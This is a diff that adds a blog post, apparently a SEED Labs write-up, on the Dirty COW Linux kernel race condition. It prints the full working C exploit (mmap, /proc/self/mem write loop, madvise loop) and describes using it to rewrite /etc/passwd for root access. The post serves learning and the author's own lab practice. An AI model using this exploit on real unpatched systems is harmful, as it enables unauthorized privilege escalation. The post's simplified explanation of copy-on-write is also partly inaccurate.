@@ -5,4 +5,157 @@ date:   2023-01-10 15:49:04 +0200
 categories: security
 ---
 
-This is an analysis of the Dirty Cow Vulnerability using a VM provided by SEED Labs.
+## This is an analysis of the [Dirty Cow Vulnerability](https://en.wikipedia.org/wiki/Dirty_COW) using a VM provided by [SEED Labs](https://seedsecuritylabs.org/Labs_20.04/Software/Dirty_COW/).
+
+Dirty COW stands for Dirty copy-on-write. I actually found this out while doing my research for this exercise. I've read about the vulnerability previously, but I didn't have hands on experience with it, or understand it in depth. So, I will be trying to do that in this blog post, and hopefully it's simple enough that you understand it too.
+
+The Dirty COW vulnerability is a very interesting case of a race condition vulnerability. It existed in the Linux kernel since 2007 and was discovered in 2016, and because the kernel runs as root, it can be exploited as a priviledge escalation vulnerability. This means attackers can gain root priviledges by exploiting it, from a low-level user.
+
+### What is a race condition? 
+
+A `race condition` can arise in software when a computer program has multiple code paths that are executing concurrently. If the multiple code paths take a different amount of time than expected, they can finish in a different order than expected, which can cause software bugs due to unanticipated behavior.
+
+### Here's how I understood it:
+
+Let's say you have a variable/object/resource `a`:
+
+    a = "DIRTY"
+
+but you also have another variable `b`:
+
+    b = a
+
+Even though these  are two variables here, they both point to the same memory object, since there is no need to take up twice the amount of memory for identical values. The OS will wait until the duplicate is modified, that is when it will allocate seperate memory for the other variable. 
+
+You modify b:
+
+    b += "COW"
+
+At this point, here is what the kernel will do:
+
+1. allocate memory for the new modified variable
+2. read the original contents of the object being duplicated
+3. perform any required changes to it i.e., append "COW"
+4. write modified contents into the newly allocated memory space
+
+The race condition exists between steps 2 and 4, which tricks the memory mapper into writing the modified contents into the original memory space instead of the newly allocated space. This is such that we end up modifying memory belonging to `a` i.e., the original object instead of `b`, even if we only had read-only privileges on `a`. The race condition allows the attacker to bypass these permissions. 
+
+It is obviously more complicated, I'd like to think, but here is a [video](https://www.youtube.com/watch?v=CQcgz43MEZg) that might help you understand.
+
+### Let's get into the lab
+
+I fired up the VM,and of course I was bombarded with alerts to upgrade to a later version. We won't be doing that for now. 
+
+The objective in this lab is to write to a read-only file using the Dirty Cow vulnerability.
+
+I'll start by creating a file as sudo, adding some text to it and modifying the privileges so that I only have read privileges to read the file. 
+
+![dirtycow0](images/dirtycow/dirtycow0.png)
+
+With a readable file ready, the next step is to edit the exploit. This exploit is made up of three threads: the main thread, the write thread and the madvise thread. The main thread maps our file to memory, finds where the pattern we want to replace is, and then creates two threads to exploit the Dirty COW race condition vulnerability in the OS kernel.
+
+    #include <sys/mman.h>
+    #include <fcntl.h>
+    #include <pthread.h>
+    #include <sys/stat.h>
+    #include <string.h>
+
+    void *map;
+    void *writeThread(void *arg);
+    void *madviseThread(void *arg);
+
+    int main(int argc, char *argv[])
+    {
+        pthread_t pth1,pth2;
+        struct stat st;
+        int file_size;
+
+        // Open the target file in the read-only mode.
+        int f=open("dirtycow", O_RDONLY);
+
+        // Map the file to COW memory using MAP_PRIVATE.
+        fstat(f, &st);
+        file_size = st.st_size;
+        map=mmap(NULL, file_size, PROT_READ, MAP_PRIVATE, f, 0);
+
+        // Find the position of the target area
+        char *position = strstr(map,"cow");                        
+
+        // We have to do the attack using two threads.
+        pthread_create(&pth1, NULL, madviseThread, (void  *)file_size); 
+        pthread_create(&pth2, NULL, writeThread, position);             
+
+        // Wait for the threads to finish.
+        pthread_join(pth1, NULL);
+        pthread_join(pth2, NULL);
+        return 0;
+    }
+
+
+![dirtycow1](images/dirtycow/dirtycow1.png)
+
+![dirtycow2](images/dirtycow/dirtycow2.png)
+
+So first we are opening our file(note that is is being opened in read-only mode) and using the string function called `strstr` we are searching where `cow` is in the mapped memory, then we start two threads, writeThread and madviseThread.
+
+The job of the writeThread is to replace the `cow` string with `wow`(or whatever we want to write). Since the mapped memory is of copy-on-write type, this thread alone will only be able to modify the contents in a copy of the mapped memory, which will not cause any change to the underlying `dirtycow` file.
+
+    void *writeThread(void *arg)
+    {
+        char *content= "wow";
+        off_t offset = (off_t) arg;
+
+        int f=open("/proc/self/mem", O_RDWR);
+        while(1) {
+            // Move the file pointer to the corresponding position.
+            lseek(f, offset, SEEK_SET);
+            // Write to the memory.
+            write(f, content, strlen(content));
+        }
+    }   
+
+
+![dirtycow3](images/dirtycow/dirtycow3.png)
+
+
+The madvise thread does only one thing: discarding the private copy of the mapped memory, so the page table can point back to the original mapped memory.
+
+If the write() and the madvise() system calls are invoked alternatively, i.e., one is invoked only after the other is finished, the write operation will always be performed on the private copy, and we will never be able to modify the target file. The only way for the attack to succeed is to perform the madvise() system call while the write() system call is still running. We cannot always achieve that, so we need to try many times. As long as the probability is not extremely low, we have a chance. That is why in the threads, we run the two system calls in an infinite loop.
+
+    void *madviseThread(void *arg)
+    {
+        int file_size = (int) arg;
+        while(1){
+            madvise(map, file_size, MADV_DONTNEED);
+        }
+    }
+
+Okay. Exploit is ready. Let's compile and execute. 
+
+![dirtycow4](images/dirtycow/dirtycow4.png)
+
+And we managed to write to the file. Now this is a very simple example to prove the concept. We can apply this to write to importantfiles in the Unix OS such as the `passwd` file. This allows us to change the privilieges that a normal user has, and upgrading them to a root user. See below.
+
+We use sudo to create a user.
+
+![dirtycow5](images/dirtycow/dirtycow5.png)
+
+See the UID is 1001, meaning `elliot` is just a normal user.
+
+![dirtycow6](images/dirtycow/dirtycow6.png)
+
+We modify our exploit and run.
+
+![dirtycow7](images/dirtycow/dirtycow7.png)
+
+We managed to replace the `elliot:x:1001` with `elliot:x:0000`, moving elliot into the root group, hence giving him root privileges.
+
+![dirtycow9](images/dirtycow/dirtycow9.png)
+
+There are a lot of use cases for this. Imagine an attacker modifies only the `1001` UID section to `0000`, making all users root users. Overall, a super simple and easy to understand exploit.
+
+I really enjoyed going in-depth to try and understand this vulnerability. Again, I oversimplified so I can understand it, (and you too)but the kernel has a lot of layers to it.
+
+Cheers!
+
+
